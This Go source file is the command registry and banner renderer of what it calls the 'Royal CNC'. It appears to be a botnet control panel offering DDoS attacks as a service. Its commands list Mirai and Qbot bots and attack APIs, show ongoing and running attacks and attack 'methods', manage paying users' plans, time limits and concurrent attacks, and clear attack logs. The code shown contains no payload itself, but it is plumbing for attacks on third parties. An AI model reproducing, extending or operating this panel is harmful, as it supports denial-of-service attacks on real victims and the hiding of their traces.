package commands

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"time"
	"webserver/src/database"
	"webserver/src/server/sessions"
)

var Commands = make(map[string]*Command)

type Command struct {
	Name        string
	Description string
	Admin       bool
	Exec        func(sesh *sessions.Session, args []string)
	Aliases     []string
}

func Init() {
	log.Printf("\u001B[0m\u001B[107m\u001B[38;5;46m[commands]\u001B[0m\u001B[38;5;046m Loading! \u001B[38;5;230m")
	Commands["clear"] = &Command{
		Name:        "\u001B[38;5;42m clear",
		Description: "\u001B[38;5;230m Clears the terminal \u001B[38;5;230m",
		Admin:       false,
		Exec:        Clear,
	}
	Commands["list"] = &Command{
		Name:        "\u001B[38;5;41m list",
		Description: "\u001B[38;5;230m list <ssh / mirai / qbot / apis> \u001B[38;5;230m",
		Admin:       true,
		Exec:        list,
	}
	Commands["users"] = &Command{
		Name:        "\u001B[38;5;41m users",
		Description: "\u001B[38;5;230m user manager \u001B[38;5;230m",
		Admin:       true,
		Exec:        users,
	}

	Commands["api"] = &Command{
		Name:        "\u001B[38;5;41m api",
		Description: "\u001B[38;5;230m api manager \u001B[38;5;230m",
		Admin:       true,
		Exec:        api,
	}
	Commands["plan"] = &Command{
		Name:        "\u001B[38;5;42m plan",
		Description: "\u001B[38;5;230m shows your plan information \u001B[38;5;230m",
		Admin:       false,
		Exec:        Plan,
	}
	Commands["ongoing"] = &Command{
		Name:        "\u001B[38;5;220m ongoing",
		Description: "\u001B[38;5;230m shows your ongoing attacks \u001B[38;5;230m",
		Admin:       false,
		Exec:        ongoing,
	}
	Commands["help"] = &Command{
		Name:        "\u001B[38;5;201m help",
		Description: "\u001B[38;5;230m gets the help menu \u001B[38;5;230m",
		Admin:       false,
		Exec:        Help,
	}
	Commands["running"] = &Command{
		Name:        "\u001B[38;5;220m running",
		Description: "\u001B[38;5;230m gets every running attack.. \u001B[38;5;230m",
		Admin:       true,
		Exec:        AllAttacks,
	}
	Commands["clogs"] = &Command{
		Name:        "\u001B[38;5;196m clogs",
		Description: "\u001B[38;5;230m clear all your attack logs! \u001B[38;5;230m",
		Admin:       false,
		Exec:        ClearLogs,
	}
	Commands["methods"] = &Command{
		Name:        "\u001B[38;5;42m methods",
		Description: "\u001B[38;5;230m Shows methods \u001B[38;5;230m",
		Admin:       false,
		Exec:        ShowMethods,
	}

	Commands["reload"] = &Command{
		Name:        "\u001B[38;5;42m reload",
		Description: "\u001B[38;5;230m reload configuration File \u001B[38;5;230m",
		Admin:       true,
		Exec:        Reload,
	}
	Commands["credits"] = &Command{
		Name:        "\u001B[38;5;196m credits",
		Description: "\u001B[38;5;230m Displays credits and information about the Royal CNC \u001B[38;5;230m",
		Admin:       false,
		Exec:        Credits,
		Aliases:     []string{"infos", "credit", "info", "information"},
	}	
	for _, v := range Commands {
		log.Printf("\u001B[0m\u001B[107m\u001B[38;5;1231m[load/cmd]\u001B[0m\u001B[38;5;041m %s : %s | Admin : %v\u001B[0m", v.Name, v.Description, v.Admin)
	}
}
func IsCommand(cmd string) bool {
	_, found := Commands[cmd]
	return found
}

func Clear(session *sessions.Session, args []string) {
	render(session, "banners/clear.txt")
}

func render(session *sessions.Session, path string) {
	file, err := os.Open(path)
	if err != nil {
		return
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	for scanner.Scan() {
		maxtime := strconv.Itoa(session.User.MaxTime)
		if strings.Contains(scanner.Text(), "<<100>>") {
			time.Sleep(100 * time.Millisecond)
		}
		if strings.Contains(scanner.Text(), "<<200>>") {
			time.Sleep(200 * time.Millisecond)
		}
		if strings.Contains(scanner.Text(), "<<300>>") {
			time.Sleep(300 * time.Millisecond)
		}
		if strings.Contains(scanner.Text(), "<<400>>") {
			time.Sleep(400 * time.Millisecond)
		}
		if strings.Contains(scanner.Text(), "<<500>>") {
			time.Sleep(500 * time.Millisecond)
		}
		if strings.Contains(scanner.Text(), "<<600>>") {
			time.Sleep(600 * time.Millisecond)
		}

		if strings.Contains(scanner.Text(), "<<700>>") {
			time.Sleep(700 * time.Millisecond)
		}

		if strings.Contains(scanner.Text(), "<<800>>") {
			time.Sleep(800 * time.Millisecond)
		}

		if strings.Contains(scanner.Text(), "<<900>>") {
			time.Sleep(900 * time.Millisecond)
		}

		if strings.Contains(scanner.Text(), "<<1000>>") {
			time.Sleep(1000 * time.Millisecond)
		}
		replacer := strings.NewReplacer(
			"<<username>>", session.User.Username,
			"<<maxtime>>", maxtime,
			"<<conns>>", strconv.Itoa(session.User.Conns),
			"<<running>>", strconv.Itoa(database.GetConcurrents(session.User.Username)),
			"<<100>>", "",
			"<<200>>", "",
			"<<300>>", "",
			"<<400>>", "",
			"<<500>>", "",
			"<<600>>", "",
			"<<700>>", "",
			"<<800>>", "",
			"<<900>>", "",
			"<<1000>>", "",
			"<<clear>>", "\033c",
		)
		lel := replacer.Replace(scanner.Text())
		fmt.Fprintf(session.Conn, "%s\r\n", lel)
	}
}

func Help(session *sessions.Session, args []string) {
	for _, v := range Commands {
		if v.Admin && session.User.Rank != 2 {
			continue
		} else {
			fmt.Fprintf(session.Conn, "%s : %s\r\n", v.Name, v.Description)
		}
	}
}
